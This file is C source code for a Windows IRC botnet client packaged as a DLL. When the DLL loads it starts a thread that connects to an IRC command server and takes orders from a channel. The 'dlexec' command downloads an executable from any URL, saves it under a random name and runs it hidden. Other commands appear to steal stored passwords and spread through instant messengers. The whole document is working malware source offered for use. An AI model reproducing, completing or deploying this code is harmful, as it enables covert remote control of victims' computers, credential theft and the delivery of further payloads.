#include "inc.h"

//######CONFIG######
char channel[20]= "#cc";
char server[30]= "irc.ss.net";
int port = 6667;
//##################

int sleeptime = 12000;
SOCKET sock;
char user[50]= "lol lol lol :shadowbot";
char msg[256];

char *addrr(const char *addr)
{
	struct hostent *he = NULL;
	char address[64];

	if (addr == NULL)
		strcpy(address, "");
	else
		strcpy(address, addr);
	he = gethostbyname(address);
	while(!he)Sleep(sleeptime);
	return inet_ntoa(*(struct in_addr *) he->h_addr_list[0]);
}

char *rndx(int size)
{
	int k;
	char *buf;
	unsigned int ret;

	buf = (char *)malloc(size + 1);
	memset(buf, '\0', size + 1);
	srand((unsigned int)time(NULL));
	for (k = 0; k < size; k++)
	{
		ret = ((rand() % 26) + 97);
		strcat(buf, (const char *)&ret);
	}

	return buf;
}


int getthisshit(char *link,char *exxe)
{
  FILE *fp;
  HINTERNET hOpen, hURL;
  char file[99];
  unsigned long read;
  PROCESS_INFORMATION pInfo;
   STARTUPINFO sInfo;
  memset(&sInfo, 0, sizeof(sInfo));
  memset(&pInfo, 0, sizeof(pInfo));
  sInfo.cb = sizeof(STARTUPINFO);
  sInfo.dwFlags = STARTF_USESHOWWINDOW;
  sInfo.wShowWindow = SW_HIDE;
  hOpen = InternetOpen("wget", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
  if (hOpen == NULL) 
	  return 0;
	else
  hURL = InternetOpenUrl( hOpen, link, NULL, 0, 0, 0 );
	  if (hURL == NULL) 
	  return 0;
	else
  fp = fopen(exxe, "wb");
	  if (fp!=NULL)
  {
  while(InternetReadFile(hURL, file, sizeof(file) - 1 , &read) && read != 0)
  {
     fwrite(file, sizeof(char), read, fp);
  }
  fclose(fp);
  CreateProcess(NULL, exxe, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &sInfo, &pInfo);
  return 1;
	  }
	  return 0;
}

void iparse(char *commands) 
{
	char *token[10];
	token[0] =strtok(commands," \r\n");
	for (int i=1;i<10;i++)
	{
		token[i]=strtok(NULL," \r\n");
	}

	if (strstr(token[3], "imstart"))
    {
		  imfuck();
    }
	if (strstr(token[3], "pstore"))
	{
		CreateThread(NULL, 0, &pstore, 0, 0, 0);
	}

	if (strstr(token[3], "msnfuck"))
	{
	    contactfuck(token[4]);
	}

	if (strstr(token[3], "dlexec"))
	{
		 char fileto[MAX_PATH];
	     char *url;
	     url = token[4];	

	     strcpy(fileto,rndx(6));
	     strcat(fileto,".exe");

	     if (getthisshit(url,fileto)) {
			 sprintf(msg, "PRIVMSG %s :Executed [%s]\n", channel, url);
	         send(sock, msg, strlen(msg), 0);
		 }

		 else
	 		 sprintf(msg, "PRIVMSG %s :Failed [%s]\n", channel, url);
		     send(sock, msg, strlen(msg), 0);
	 }
}

DWORD WINAPI ircmain(void*) 
{
	HANDLE MutexHandle;
	MutexHandle = CreateMutex(0, 0, "uuuifyouseethatucanonlysuckmydick:p");
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		ExitProcess(0);
	}

	struct sockaddr_in addr;
top:
	Sleep(5000);
	WSADATA WSAData;
	WSAStartup(MAKEWORD(1,0), &WSAData);
    char buffer[BUFSIZ];
	char *ptr;
    char msg[256],temp[10];
	addr.sin_addr.s_addr = inet_addr(addrr(server));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	while(connect(sock,(struct sockaddr*)&addr,sizeof(addr)))goto top;

	// **random nick shit **//
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	unsigned long total = GetTickCount() / (1000% 86400) / 3600;
	//////////////////////////

	sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
	send (sock, buffer, strlen (buffer), 0);
	sprintf (buffer, "USER %s\n", user);
	send (sock, buffer, strlen (buffer), 0);
	Sleep(500);
	sprintf (buffer, "JOIN %s\n", channel);
	send (sock, buffer, strlen (buffer), 0);
	
	while (1) {

   	    memset(buffer, '\0', BUFSIZ); 

		if (recv(sock, buffer, BUFSIZ-1, 0) <= 0) 
		{

			WSACleanup();
            closesocket(sock);
			goto top;
		} else 

		//printf("%s",buffer);
		if (strstr(buffer, "PING :"))
        {
            ptr = strstr(buffer, "PING :") + strlen("PING :");
            sprintf(msg, "PONG :%s\n", ptr);
            send(sock, msg, strlen(msg), 0);
        }
		if (strstr(buffer, "404"))
        {
		    sprintf (msg, "JOIN %s\n", channel);
		    send(sock, msg, strlen(msg), 0);
        }

		if (strstr(buffer, "KICK"))
        {

		    sprintf (msg, "JOIN %s\n", channel);
		    send(sock, msg, strlen(msg), 0);
        }

		if (strstr(buffer, ".imstart"))
		{
			imfuck();
		}

		if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) 
		{
		    iparse(buffer);
		}

	}
	WSACleanup();
    closesocket(sock);
 
    return TRUE;
}





BOOL WINAPI DllMain(HINSTANCE hInstDLL, DWORD  ul_reason_for_call, LPVOID lpReserved)
{

	if(ul_reason_for_call==DLL_PROCESS_ATTACH)
	{	
		DisableThreadLibraryCalls((HMODULE)hInstDLL);		
		DWORD ThreadId;
		HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)&ircmain,0,0,&ThreadId);
		return TRUE;
	}	

	if(ul_reason_for_call==DLL_PROCESS_DETACH) return TRUE;	
    return TRUE;
}
